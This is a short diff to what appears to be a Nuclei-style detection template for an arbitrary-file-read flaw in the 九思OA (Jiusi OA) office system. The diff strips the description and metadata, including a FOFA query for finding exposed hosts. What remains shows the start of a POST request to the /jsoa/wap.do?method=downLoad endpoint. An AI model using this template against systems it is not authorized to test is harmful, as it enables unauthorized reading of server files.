@@ -3,12 +3,8 @@ info:
   name: 九思OA wap 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uu9znkxnqqrkap1y'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: uu9znkxnqqrkap1y
-    fofa: body="/jsoa/login.jsp"
 http:
 - raw:
   - 'POST /jsoa/wap.do?method=downLoad HTTP/1.1
